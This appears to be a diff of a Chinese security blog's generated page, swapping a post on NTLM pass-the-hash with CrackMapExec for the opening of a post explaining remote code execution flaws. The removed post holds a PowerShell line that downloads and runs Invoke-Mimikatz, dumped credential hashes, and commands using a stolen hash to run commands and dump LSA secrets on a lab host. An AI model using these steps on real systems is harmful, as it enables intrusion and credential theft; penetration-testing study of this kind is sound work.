@@ -6,8 +6,8 @@
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
   <meta name="viewport" content="width=device-width, initial-scale=1">
 
-  <title>使用CrackMapExec 进行 NTLM Hash传递攻击 « 倾旋的博客</title>
-  <meta name="description" content="本文介绍一个工具 - CrackMapExec 进行 NTLM Hash传递攻击">
+  <title>《Web安全测试学习手册》- 远程代码执行 « 倾旋的博客</title>
+  <meta name="description" content="《Web安全测试学习手册》- 远程代码执行">
 
   <link rel="stylesheet" href="/css/main.css">
   <link rel="canonical" href="http://localhost:4000/archivers/2018-03-22/1">
@@ -42,130 +42,43 @@
           <div class="post">
 
   <header class="post-header">
-    <h1 class="post-title">使用CrackMapExec 进行 NTLM Hash传递攻击</h1>
+    <h1 class="post-title">《Web安全测试学习手册》- 远程代码执行</h1>
     <p class="post-meta">Mar 22, 2018</p>
   </header>
 
   <article class="post-content">
-    <p>本文介绍一个工具 - CrackMapExec 进行 NTLM Hash传递攻击
+    <p>《Web安全测试学习手册》- 远程代码执行
 <!--more--></p>
 
-<h2 id="0x01-前言">0x01 前言</h2>
+<h2 id="0x00-远程代码执行---介绍">0x00 远程代码执行 - 介绍</h2>
 
-<p>早期<code class="highlighter-rouge">SMB</code>协议在网络上传输明文口令。后来出现 <code class="highlighter-rouge">LAN Manager Challenge/Response </code>验证机制，简称<code class="highlighter-rouge">LM</code>，它是如此简单以至很容易就被破解。微软提出了WindowsNT挑战/响应验证机制，称之为NTLM。</p>
+<h3 id="1什么是远程代码执行">1）什么是远程代码执行</h3>
 
-<p>从<code class="highlighter-rouge">Win2000</code>开始默认协议为<code class="highlighter-rouge">Kerboros</code>，下列情况会调用<code class="highlighter-rouge">NTLM</code>：</p>
+<p>远程命令执行 英文名称：<strong>RCE remote code execution</strong> ，简称<strong>RCE</strong>漏洞，是指用户通过浏览器提交执行命令，由于服务器端没有针对执行函数做过滤，导致在没有指定绝对路径的情况下就执行命令，可能会允许攻击者通过改变 $PATH 或程序执行环境的其他方面来执行一个恶意构造的代码。</p>
+
+<h3 id="2远程代码执行的特点">2）远程代码执行的特点</h3>
+
+<p>远程代码执行是指攻击者可能会通过远调用的方式来攻击或控制计算机设备，无论该设备在哪里。</p>
+
+<h2 id="0x01-远程代码执行---风险等级">0x01 远程代码执行 - 风险等级</h2>
+
+<p><strong>高</strong></p>
+
+<h2 id="0x02-远程代码执行---原理">0x02 远程代码执行 - 原理</h2>
+
+<p>由于开发人员编写源码，没有针对代码中可执行的特殊函数入口做过滤，导致客户端可以提交恶意构造语句提交，并交由服务器端执行。命令注入攻击中WEB服务器没有过滤类似system(),eval()，exec()等函数是该漏洞攻击成功的最主要原因。</p>
+
+<h2 id="0x03-远程代码执行---常见场景">0x03 远程代码执行 - 常见场景</h2>
 
 <ul>
-  <li>遗留客户端或服务器需要登录到网络或本地时。</li>
-  <li>UNIX客户端需要与NT服务器通话时。</li>
-  <li>有正在使用验证<code class="highlighter-rouge">NTLM</code>的服务器信息块<code class="highlighter-rouge">（SMB）</code>后台程序的UNIX客户端时。</li>
-  <li>也即认证方或被认证方有仅支持NTLM情况时。</li>
+  <li>使用了危险函数的Web应用</li>
+  <li>低版本的Java语言Struts框架</li>
 </ul>
 
-<p>它以<code class="highlighter-rouge">挑战/响应（Challenge/Response）</code>顺序为基础。</p>
+<h2 id="0x04-测试方案">0x04 测试方案</h2>
 
-<ul>
-  <li>1.客户端发送用户名和域名到服务器。</li>
-  <li>2.服务器转发到域控制器DC。</li>
-  <li>3.<code class="highlighter-rouge">DC</code>用客户端密码随机产生一个<code class="highlighter-rouge">8字节</code>得挑战<code class="highlighter-rouge">（Challenge）</code>，发送给服务器。</li>
-  <li>4.服务器将挑战转发给客户端。</li>
-  <li>5.客户端用密码经过<code class="highlighter-rouge">hash</code>及<code class="highlighter-rouge">DES</code>加密算法等操作得到一个加密结果响应<code class="highlighter-rouge">（Response）</code>发送给服务器。</li>
-  <li>6.服务器将响应转发给<code class="highlighter-rouge">DC</code>。</li>
-  <li>7.<code class="highlighter-rouge">DC</code>做同样操作验证客户端响应。</li>
-  <li>8.验证结束，返回结果通知服务器。</li>
-</ul>
+<h3 id="1php中常见场景">1）PHP中常见场景</h3>
 
-<h2 id="0x02-ntlm对渗透的作用">0x02 NTLM对渗透的作用</h2>
-
-<p>NTLM就好像是一个令牌，有了这个令牌就相当于获取了这个令牌所属者的权限。</p>
-
-<p>最大的特点就是我们可以使用<code class="highlighter-rouge">SMB</code>执行<code class="highlighter-rouge">Command</code>。</p>
-
-<h2 id="0x03-crackmapexec-介绍">0x03 CrackMapExec 介绍</h2>
-
-<p>CrackMapExec提供了域环境（活动目录）渗透测试中一站式便携工具，它具有列举登录用户、通过SMB(Server Message Block)网络文件共享协议爬虫列出SMB分享列表，执行类似于Psexec的攻击、使用powerShell脚本执行自动式Mimikatz/Shellcode/DLL注入到内存中，dump NTDS.dit密码。</p>
-
-<p>WiKi:https://github.com/byt3bl33d3r/CrackMapExec/wiki</p>
-
-<h2 id="0x03-安装crackmapexec">0x03 安装CrackMapExec</h2>
-
-<h3 id="kali-linux">Kali Linux</h3>
-
-<p><code class="highlighter-rouge">apt-get install crackmapexec</code></p>
-
-<h3 id="debianubuntu">Debian/Ubuntu</h3>
-
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>apt-get install -y libssl-dev libffi-dev python-dev build-essential
-pip install crackmapexec
-</code></pre></div></div>
-
-<h2 id="0x04-传递ntlm-hash执行命令">0x04 传递NTLM Hash执行命令</h2>
-
-<h3 id="使用mimikatz获取ntlm-hash">使用<code class="highlighter-rouge">Mimikatz</code>获取<code class="highlighter-rouge">NTLM Hash</code></h3>
-
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
-PS C:\Users\administrator\Documents&gt;IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1')
-
-PS C:\Users\administrator\Documents&gt;Invoke-Mimikatz
-
-</code></pre></div></div>
-
-<p>获取NTLM Hash</p>
-
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>****
-        msv :
-         [00000003] Primary
-         * Username : Administrator
-         * Domain   : PAYLOADS
-         * LM       : 5609e3f4c7c56d5fa86fb73c70515bd7
-         * NTLM     : dab7de8feeb5ecac65faf9fdc6cac3a9
-         * SHA1     : 67302089bba4993f2f845e5992db0a21e64679fa
-        tspkg :
-         * Username : Administrator
-         * Domain   : PAYLOADS
-         * Password : ****
-        wdigest :
-         * Username : Administrator
-         * Domain   : PAYLOADS
-         * Password : ****
-        kerberos :
-         * Username : Administrator
-         * Domain   : PAYLOADS.ONLINE
-         * Password : ****
-        ssp :
-        credman :
-
-****
-
-</code></pre></div></div>
-
-<h3 id="使用crackmapexec执行命令">使用<code class="highlighter-rouge">CrackMapExec</code>执行命令</h3>
-
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/cache# cme smb 192.168.3.5 -u administrator -H dab7de8feeb5ecac65faf9fdc6cac3a9 -x whoami
-SMB         192.168.3.5     445    LIYINGZHEA30B    [*] Windows 7 Ultimate 7601 Service Pack 1 x64 (name:LIYINGZHEA30B) (domain:PAYLOADS) (signing:False) (SMBv1:True)
-SMB         192.168.3.5     445    LIYINGZHEA30B    [+] PAYLOADS\administrator dab7de8feeb5ecac65faf9fdc6cac3a9 (Pwn3d!)
-SMB         192.168.3.5     445    LIYINGZHEA30B    [+] Executed command 
-SMB         192.168.3.5     445    LIYINGZHEA30B    payloads\administrator
-</code></pre></div></div>
-
-<h3 id="使用crackmapexec获取本地密码local-security-authoritylsa">使用<code class="highlighter-rouge">CrackMapExec</code>获取本地密码(Local Security Authority)LSA</h3>
-
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/cache# cme smb 192.168.3.5 -u administrator -H dab7de8feeb5ecac65faf9fdc6cac3a9 --lsa
-SMB         192.168.3.5     445    LIYINGZHEA30B    [*] Windows 7 Ultimate 7601 Service Pack 1 x64 (name:LIYINGZHEA30B) (domain:PAYLOADS) (signing:False) (SMBv1:True)
-SMB         192.168.3.5     445    LIYINGZHEA30B    [+] PAYLOADS\administrator dab7de8feeb5ecac65faf9fdc6cac3a9 (Pwn3d!)
-SMB         192.168.3.5     445    LIYINGZHEA30B    [+] Dumping LSA secrets
-SMB         192.168.3.5     445    LIYINGZHEA30B    WinHack:d3a4b1078aba22996575dd38056e3c99:PAYLOADS.ONLINE:PAYLOADS:::
-SMB         192.168.3.5     445    LIYINGZHEA30B    Administrator:ff007a95ee46c0240e7f0c4b9b0c890a:PAYLOADS.ONLINE:PAYLOADS:::
-SMB         192.168.3.5     445    LIYINGZHEA30B    PAYLOADS\LIYINGZHEA30B$:aad3b435b51404eeaad3b435b51404ee:eda8896ce9133d0bcaf0b6ece9cb0d45:::
-SMB         192.168.3.5     445    LIYINGZHEA30B    DPAPI_SYSTEM:01000000faf06c0f43acbed98d62bd9829d053acb06a00f159e3419d193ff5be56c028fe8d7f0053161d9331
-SMB         192.168.3.5     445    LIYINGZHEA30B    NL$KM:ac8c8a7ce1dd903d74a231a44fcf5df82db711df62e495da9b5f10c3a52dd618a8abce6975c69fea6a9ed69ff6511c62f9a750b5d696a69c3221dc0f1f849f3d
-SMB         192.168.3.5     445    LIYINGZHEA30B    [+] Dumped 5 LSA secrets to /root/.cme/logs/LIYINGZHEA30B_192.168.3.5_2018-03-27_155122.lsa and /root/.cme/logs/LIYINGZHEA30B_192.168.3.5_2018-03-27_155122.cached
-</code></pre></div></div>
-
-<h3 id="more-">More …</h3>
-
-<p>后续再加</p>
 
   </article>
   
@@ -187,7 +100,7 @@ SMB         192.168.3.5     445    LIYINGZHEA30B    [+] Dumped 5 LSA secrets to 
     <a href="https://github.com/rvn0xsy">GitHub</a>
     
     
-    <a href="mailto:payloads@aliyun.com">Email</a>
+    <a href="javascript:document.write('payloads'+'@'+'aliyun.com');">Email</a>
     
     <div class="bdsharebuttonbox"><a href="#" class="bds_more" data-cmd="more"></a><a href="#" class="bds_twi" data-cmd="twi" title="分享到Twitter"></a><a href="#" class="bds_fbook" data-cmd="fbook" title="分享到Facebook"></a><a href="#" class="bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a><a href="#" class="bds_weixin" data-cmd="weixin" title="分享到微信"></a><a href="#" class="bds_evernotecn" data-cmd="evernotecn" title="分享到印象笔记"></a><a href="#" class="bds_youdao" data-cmd="youdao" title="分享到有道云笔记"></a><a href="#" class="bds_sqq" data-cmd="sqq" title="分享到QQ好友"></a><a href="#" class="bds_qzone" data-cmd="qzone" title="分享到QQ空间"></a><a href="#" class="bds_tieba" data-cmd="tieba" title="分享到百度贴吧"></a><a href="#" class="bds_copy" data-cmd="copy" title="分享到复制网址"></a><a href="#" class="bds_print" data-cmd="print" title="分享到打印"></a></div>
 <script>window._bd_share_config={"common":{"bdSnsKey":{},"bdText":"","bdMini":"2","bdMiniList":["mshare","qzone","tsina","bdysc","weixin","sqq","youdao","mail","fbook","twi","linkedin","h163","evernotecn","copy","print"],"bdPic":"","bdStyle":"1","bdSize":"16"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];</script>
@@ -198,7 +111,7 @@ SMB         192.168.3.5     445    LIYINGZHEA30B    [+] Dumped 5 LSA secrets to 
   <div class="col-box-title">Newest Posts</div>
   <ul class="post-list">
     
-      <li><a class="post-link" href="/archivers/2018-03-22/1">使用CrackMapExec 进行 NTLM Hash传递攻击</a></li>
+      <li><a class="post-link" href="/archivers/2018-03-27/1">使用CrackMapExec 进行 NTLM Hash传递攻击</a></li>
     
       <li><a class="post-link" href="/archivers/2018-03-22/1">《Web安全测试学习手册》- 远程代码执行</a></li>
     
